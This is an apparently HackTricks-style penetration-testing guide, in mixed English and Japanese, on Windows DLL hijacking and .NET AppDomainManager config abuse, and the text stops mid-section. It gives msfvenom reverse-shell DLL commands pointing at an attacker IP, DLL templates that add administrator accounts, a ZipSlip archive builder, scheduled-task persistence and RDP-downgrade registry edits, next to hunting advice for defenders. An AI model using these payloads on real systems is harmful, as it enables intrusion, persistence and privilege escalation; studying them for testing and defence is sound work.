# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking involves manipulating a trusted application into loading a malicious DLL. This term encompasses several tactics like **DLL Spoofing, Injection, and Side-Loading**. It's mainly utilized for code execution, achieving persistence, and, less commonly, privilege escalation. Despite the focus on escalation here, the method of hijacking remains consistent across objectives.

### Common Techniques

Several methods are employed for DLL hijacking, each with its effectiveness depending on the application's DLL loading strategy:

1. **DLL Replacement**: 正規の DLL を悪意あるものに差し替える。必要に応じて DLL Proxying を使い、元の DLL の機能を維持する。
2. **DLL Search Order Hijacking**: アプリケーションの探索パターンを悪用し、正規の DLL より前にある探索パスへ悪意ある DLL を配置する。
3. **Phantom DLL Hijacking**: 存在しない必要 DLL をアプリケーションに読み込ませるため、悪意ある DLL を作成する。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意ある DLL へ向ける。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内で正規の DLL を悪意あるものに置き換える。これは DLL side-loading と関連する手法であることが多い。
6. **Relative Path DLL Hijacking**: ユーザーが制御できるディレクトリに、コピーしたアプリケーションと一緒に悪意ある DLL を配置する。Binary Proxy Execution の手法に似ている。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading is not the only way to make a trusted **.NET Framework** process load attacker code. If the target executable is a **managed** application, the CLR also consults an **application configuration file** named after the executable (for example `Setup.exe.config`). That file can define a custom **AppDomainManager**. If the config points to an attacker-controlled assembly placed next to the EXE, the CLR loads it **before the application's normal code path** and runs inside the trusted process.

Per Microsoft's .NET Framework configuration schema, both `<appDomainManagerAssembly>` and `<appDomainManagerType>` must be present for the custom manager to be used.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践的な注意点:
- これは **.NET Framework 固有** の手法です。Win32 の DLL search order ではなく、CLR の config 解析に依存します。
- ホストは本当に **managed EXE** である必要があります。簡易判定: `sigcheck -m target.exe`、`corflags target.exe`、または PE metadata の **CLR Runtime Header** を確認します。
- config ファイル名は実行ファイル名と完全一致している必要があります (`<binary>.config`)。通常は **EXE の隣** に置かれます。
- これは **署名付き Microsoft/vendor binaries** で特に有用です。信頼された EXE は変更されず、malicious managed assembly が in-process で実行されます。
- すでに書き込み可能な installer/update ディレクトリがあるなら、AppDomainManager hijacking を **first stage** として使い、その後の stage で classic DLL sideloading や reflective loading を使えます。

### AppDomainManager as a downloader + scheduled-task bootstrap

実践的な侵入パターンとして、信頼された managed EXE に、悪意ある `*.config` と、**小さな bootstrapper** としてのみ動作する悪意ある AppDomainManager DLL を組み合わせます:

1. ユーザーが `%USERPROFILE%\Downloads` のようなもっともらしい場所から、署名付きの .NET installer または updater を起動します。
2. 隣接する config により、CLR は正規のアプリロジックが始まる **前** に attacker assembly を読み込みます。
3. 悪意ある manager は **path gate** を実行します（例: host EXE が `Downloads` から実行されている場合のみ継続し、second stage は `%LOCALAPPDATA%` からのみ実行を許可する）。
4. チェックに通った場合、実際の payload を `%LOCALAPPDATA%\PerfWatson2.exe` のようなユーザー書き込み可能な path にダウンロードし、scheduled task で persistence を設定します。

この変種が重要な理由:
- 署名付き host EXE は変更されないため、main binary のハッシュだけを見る triage では compromise を見逃す可能性があります。
- 単純な **path-based anti-analysis** は一般的です。ZIP/EXE/DLL の triad を Desktop、Temp、または sandbox path に移すと、意図的に chain を壊せます。
- first-stage の AppDomainManager DLL は小さく低ノイズに保てる一方で、real implant は後で取得できます。

このパターンでよく見られる最小限の persistence 例:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` は、そのユーザー/セッションで利用可能な **最高権限** を意味するだけで、単体で SYSTEM への昇格が保証されるわけではない。
- この technique は、classic な missing-DLL search-order hijacking よりも、**.NET config abuse による execution/persistence** として分類するほうが適切なことが多いが、operator はしばしば両方を連鎖させる。

Detection pivots:
- **ZIP extraction paths**、`Downloads`、`%TEMP%`、または他の user-writable フォルダから起動された signed .NET executables で、`<exe>.config` が **colocated** しているもの。
- アクションが `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` を指し、名前が browser/vendor updater を模した新しい scheduled tasks。
- すぐに別の EXE を download し、その後 `schtasks.exe` を spawn する短命の managed bootstrap processes。
- executable path が想定された user-profile directory と一致しない限り、早期に exit する samples。

### Hijacking an existing scheduled task to relaunch the sideload chain

For persistence, do not only look for **creating a new task**. Some intrusion sets wait until a legitimate installer creates a **normal updater task** and then **rewrite the task action** so the existing name, author, and trigger stay familiar to defenders.

Reusable workflow:
1. 正規ソフトウェアを install/run し、通常作成される task を特定する。
2. task XML を export し、現在の `<Exec><Command>` / `<Arguments>` の値を確認する。
3. action だけを置き換え、task が user-writable な staging directory からあなたの **trusted host EXE** を起動し、その後で real payload を side-load もしくは AppDomain-load するようにする。
4. 新しい分かりやすい persistence artifact を作るのではなく、同じ task name を再登録する。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Why it is stealthier:
- Task name can still look legitimate (for example a vendor updater).
- The **Task Scheduler service** launches it, so parent/ancestor validation often sees the expected scheduling chain instead of `explorer.exe`.
- DFIR teams that only hunt for **new task names** may miss a task whose registration already existed but whose action now points to `%LOCALAPPDATA%`, `%APPDATA%`, or another attacker-controlled path.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Compare `C:\Windows\System32\Tasks\*` XML and `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata against a baseline.
- Alert when a **vendor-looking updater task** executes from **user-writable directories** or launches a .NET EXE with a colocated `*.config` file.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## 不足している Dll の検出

システム内で不足している Dll を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を実行し、**次の 2 つのフィルターを設定**することです:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

**一般的な不足している dll** を探している場合は、これを **数秒間** 実行したままにします。\
**特定の実行ファイル内の不足している dll** を探している場合は、**"Process Name" "contains" `<exec name>` のような別のフィルターを設定し、実行して、イベントのキャプチャを停止**します。

## 不足している Dll の悪用

権限昇格を行うために最も有効なのは、**特権プロセスが読み込もうとする dll を書き込める**こと、そしてその dll が**検索される場所のどこか**に置けることです。したがって、**元の dll** があるフォルダよりも前に dll が検索されるフォルダへ dll を **書き込める**か、あるいは dll が検索されるフォルダのどこかに **書き込めて**、なおかつ元の **dll** がどのフォルダにも存在しない、という状況を作れます。

### Dll Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)** の中に、Dll が具体的にどのように読み込まれるかが記載されています。

**Windows applications** は、あらかじめ定義された **search paths** に従って DLL を探し、特定の順序で検索します。DLL hijacking の問題は、悪意ある DLL をこれらのディレクトリのどれかに戦略的に配置し、正規の DLL より先に読み込まれるようにすることで発生します。これを防ぐには、アプリケーションが必要とする DLL を参照するときに absolute paths を使うようにします。

32-bit システムでの **DLL search order** は以下のとおりです。

1. アプリケーションが読み込まれたディレクトリ。
2. system directory. このディレクトリのパスを取得するには [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 関数を使います。(_C:\Windows\System32_)
3. 16-bit system directory. このディレクトリのパスを取得する関数はありませんが、検索対象にはなります。(_C:\Windows\System_)
4. Windows directory. このディレクトリのパスを取得するには [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 関数を使います。
1. (_C:\Windows_)
5. current directory.
6. PATH environment variable に सूचीされているディレクトリ。なお、これは **App Paths** registry key で指定された per-application path は含みません。**App Paths** key は DLL search path の計算には使われません。

これは **SafeDllSearchMode** が有効な場合の **default** search order です。無効にすると current directory は 2 番目に繰り上がります。この機能を無効にするには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（default は有効）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 関数を **LOAD_WITH_ALTERED_SEARCH_PATH** 付きで呼び出すと、検索は **LoadLibraryEx** が読み込もうとしている executable module のディレクトリから始まります。

最後に、**dll は名前だけでなく absolute path を指定して読み込まれることがある**点に注意してください。その場合、その dll は **その path でのみ** 検索されます（dll に依存関係がある場合、それらは名前だけで読み込まれた場合と同様に検索されます）。

search order を変更する他の方法もありますが、ここでは説明しません。

### 任意ファイル書き込みを missing-DLL hijack につなげる

1. **ProcMon** フィルター（`Process Name` = target EXE、`Path` が `.dll` で終わる、`Result` = `NAME NOT FOUND`）を使って、プロセスが探したが見つけられなかった DLL 名を収集します。
2. binary が **schedule/service** 上で動作する場合、それらの名前の DLL を **application directory**（search-order entry #1）に配置すると、次回実行時に読み込まれます。ある .NET scanner のケースでは、プロセスは実際のコピーを `C:\Program Files\dotnet\fxr\...` から読み込む前に、`C:\samples\app\` 内の `hostfxr.dll` を探していました。
3. 任意の export を持つ payload DLL（例: reverse shell）を作成します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. primitive が **ZipSlip-style arbitrary write** なら、展開ディレクトリを抜ける ZIP entry を作成し、DLL を app folder に配置します:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. アーカイブを監視されている inbox/share に届ける; スケジュールされたタスクがプロセスを再起動すると、悪意のある DLL が読み込まれ、service account としてあなたの code が実行される。

### RTL_USER_PROCESS_PARAMETERS.DllPath を使って sideloading を強制する

新しく作成された process の DLL search path を決定的に操作する高度な方法は、ntdll の native APIs で process を作成する際に RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここに attacker-controlled な directory を指定すると、名前で imported DLL を解決する target process（absolute path を使わず、safe loading flags も使っていないもの）に、そこから malicious DLL を読み込ませることができます。

Key idea
- RtlCreateProcessParametersEx で process parameters を構築し、あなたが制御する folder を指す custom DllPath を指定する（例: dropper/unpacker が置かれている directory）。
- RtlCreateUserProcess で process を作成する。target binary が DLL を名前で解決すると、loader は resolution 中にこの指定された DllPath を参照し、malicious DLL が target EXE と同じ場所になくても reliable な sideloading が可能になる。

Notes/limitations
- これは作成される child process に影響する; current process のみに影響する SetDllDirectory とは異なる。
- target は name による DLL import または LoadLibrary を行う必要がある（absolute path ではなく、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories を使っていないこと）。
- KnownDLLs と hardcoded absolute paths は hijack できない。forwarded exports と SxS により precedence が変わる場合がある。

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- DllPath ディレクトリに、悪意のある xmllite.dll（必要な関数を export するか、実際の DLL を proxy する）を配置する。
- 上記の technique を使って xmllite.dll を名前で検索することが知られている署名付き binary を起動する。loader は指定された DllPath 経由で import を解決し、あなたの DLL を sideload する。

この technique は、multi-stage sideloading chain を動かす in-the-wild の事例が確認されている。最初の launcher が helper DLL を drop し、その後 Microsoft-signed で hijack 可能な binary を custom DllPath 付きで起動して、staging directory から attacker の DLL を強制的に load する。


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** のターゲットでは、メモリを patch せずに **`Main()` の前** で sideloading を行える。これはアプリケーションに隣接する **`.exe.config`** ファイルを悪用する方法である。Win32 の DLL search order だけに頼るのではなく、attacker は正規の .NET EXE の横に悪意のある config と、1つ以上の attacker-controlled assemblies を置く。

chain の動き:
1. host EXE が起動し、**CLR が `<exe>.config` を読み込む**。
2. config が **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、runtime が attacker-controlled な `AppDomainManager` を instantiate する。
3. 悪意のある manager が trusted host process 内で **`Main()` 前に実行** される。
4. 同じ config により、CLR は local assemblies を先に解決するよう強制できる（例: `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`）。また inline patching なしで runtime の validation / telemetry を弱められる。

Campaign-style pattern（正確な nesting は directive / CLR version により変わる場合がある）:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
なぜこれが有用か:
- **`<probing privatePath="."/>`** は assembly resolution を application directory に固定し、フォルダを予測可能な sideloading surface に変えます。
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は、CLR initialization 中に正規の app logic が動く前に、実行を attacker code に移します。
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust app が strong-name validation failure なしで unsigned または改ざんされた assemblies を読み込める場合があります。
- **`<publisherPolicy apply="no"/>`** は、より新しい assemblies への publisher-policy redirects を回避します。
- **`<requiredRuntime ... safemode="true"/>`** は runtime selection をより deterministic にします。
- **`<etwEnable enabled="false"/>`** が特に興味深いのは、**CLR が自分自身の ETW visibility を configuration から無効化する**ためで、implant がメモリ上で `EtwEventWrite` を patch する必要がないからです。

最近の campaigns で見られる operational pattern:
- Stage 1 では `setup.exe`、`setup.exe.config`、および local assemblies を配置します。
- Stage 2 では、それらをもっともらしい **AppData update** フォルダにコピーし、host を `update.exe` のような名前に変更して、**scheduled task** 経由で再実行します。
- Stage 3 では、最終的な RAT DLL/export を読み込む前に、実行 context（たとえば Task Scheduler から来る想定の parent `svchost.exe`）を確認します。

hunting ideas:
- user-writable locations で、隣接する **`.config`** ファイルを伴って suspicious に動作する、署名済みまたはそれ以外でも正規な **`.NET executables`**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** や app-specific の `\bin\update\` ディレクトリから、名前を変えた update binaries を再起動する scheduled tasks。
- scheduled task が trusted な .NET host を起動し、その直後に自分の directory から vendor 以外の assemblies を読み込む parent/child chains。

#### Windows docs にある DLL search order の例外

Windows documentation では、標準的な DLL search order にはいくつかの例外が記載されています:

- すでに memory に読み込まれているものと同じ名前を持つ **DLL** が見つかった場合、システムは通常の search を迂回します。その代わり、redirection と manifest の確認を行ってから、既に memory にある DLL を default にします。**この scenario では、システムは DLL の search を行いません**。
- DLL が現在の Windows version の **known DLL** として認識される場合、システムはその known DLL の version と、その依存 DLL を使用し、**search process を省略します**。registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これら known DLL の一覧が格納されています。
- **DLL に dependencies がある**場合、それら dependent DLL の search は、初期の DLL が full path で特定されていても、あたかも **module names** だけで示されているかのように実行されます。

### Privileges の Escalating

**Requirements**:

- **different privileges**（horizontal または lateral movement）で動作する、または動作する予定のプロセスを特定し、そのプロセスが **DLL を欠いている**こと。
- **DLL** が **search** される **directory** に対して、**write access** があることを確認する。この場所は、実行ファイルの directory か、system path 内の directory である可能性があります。

そう、必要条件を見つけるのはかなり面倒です。**default では、privileged executable が DLL を欠いているのを見つけるのはかなり変ですし**、さらに **system path の folder に write permissions があるのはもっと変**です（通常はできません）。しかし、misconfigured な環境では可能です。\
運よく必要条件を満たしているなら、[UACME](https://github.com/hfiref0x/UACME) project を確認できます。**main goal は UAC bypass** ですが、Windows version 向けの Dll hijaking の **PoC** が見つかることがあり、使える場合があります（おそらく、write permissions がある folder の path を変えるだけで済みます）。

folder で permissions を確認するには、次のようにします:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH 内のすべてのフォルダの権限を確認する**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
実行ファイルの imports と dll の exports は次のように確認できます:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH 内の任意のフォルダに書き込み権限があるかを確認します。\
この脆弱性を見つけるための他の興味深い自動化ツールは **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._ です。

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [**Medium Integrity level** から **High** へ昇格する **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or [**High Integrity** から **SYSTEM** へ](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) を取得する:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成する（x86版のみで、x64版は見当たりませんでした）:**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分の

いくつかのケースでは、コンパイルした Dll が、被害者プロセスによって読み込まれることになる**複数の関数を export** する必要があります。これらの関数が存在しない場合、**binary はそれらを読み込めず**、**exploit は失敗**します。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成付きの C++ DLL example</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>スレッドエントリ付きの代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は、起動時に予測可能な言語固有の localization DLL を今でも probe し、任意の code execution と persistence に悪用できます。

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- もし書き込み可能な attacker-controlled DLL が OneCore path に存在すると、それが load され、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator and observe the attempted load of the above path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Naiveな hijack は UI をしゃべらせたりハイライトしたりする。静かにするには、attach 時に Narrator の thread を列挙し、メイン thread を (`OpenThread(THREAD_SUSPEND_RESUME)`) 開いて `SuspendThread` で止め、自分の thread で継続する。完全な code は PoC を参照。

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記により、Narrator を起動すると planted DLL が load される。secure desktop（logon screen）では、CTRL+WIN+ENTER を押して Narrator を起動すると、DLL は secure desktop 上で SYSTEM として実行される。

RDP-triggered SYSTEM execution (lateral movement)
- classic RDP security layer を許可する: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- host に RDP し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動する。DLL は secure desktop 上で SYSTEM として実行される。
- RDP session が閉じると execution は停止するため、速やかに inject/migrate する。

Bring Your Own Accessibility (BYOA)
- built-in Accessibility Tool (AT) の registry entry（例: CursorIndicator）を clone し、任意の binary/DLL を指すように edit して import し、その後 `configuration` をその AT name に設定できる。これにより Accessibility framework の下で任意 code execution を proxy できる。

Notes
- `%windir%\System32` への書き込みと HKLM 値の変更には admin 権限が必要。
- すべての payload logic は `DLL_PROCESS_ATTACH` に置ける。exports は不要。

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

この case は、Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を示しており、**CVE-2025-1729** として追跡されている。

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` は `C:\ProgramData\Lenovo\TPQM\Assistant\` にある。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、ログオン中ユーザーの context で毎日 9:30 AM に実行される。
- **Directory Permissions**: `CREATOR OWNER` が書き込み可能で、local users が arbitrary files を配置できる。
- **DLL Search Behavior**: まず working directory から `hostfxr.dll` の load を試み、欠落していれば "NAME NOT FOUND" を記録する。これは local directory search の優先順位を示している。

### Exploit Implementation

attacker は、同じ directory に malicious な `hostfxr.dll` stub を配置することで、欠落している DLL を悪用し、user の context で code execution を達成できる。
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置する。
2. スケジュールされたタスクが 9:30 AM に現在のユーザーのコンテキストで実行されるのを待つ。
3. タスク実行時に administrator がログインしている場合、悪意のある DLL は administrator のセッション内で medium integrity で実行される。
4. 標準的な UAC bypass techniques を連鎖させて、medium integrity から SYSTEM privileges に昇格する。

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors は、信頼された signed process の下で payload を実行するために、MSI-based droppers と DLL side-loading を組み合わせることが多い。

Chain overview
- User が MSI をダウンロードする。CustomAction が GUI install 中にサイレントに実行され（例: LaunchApplication または VBScript action）、埋め込みリソースから次の stage を再構築する。
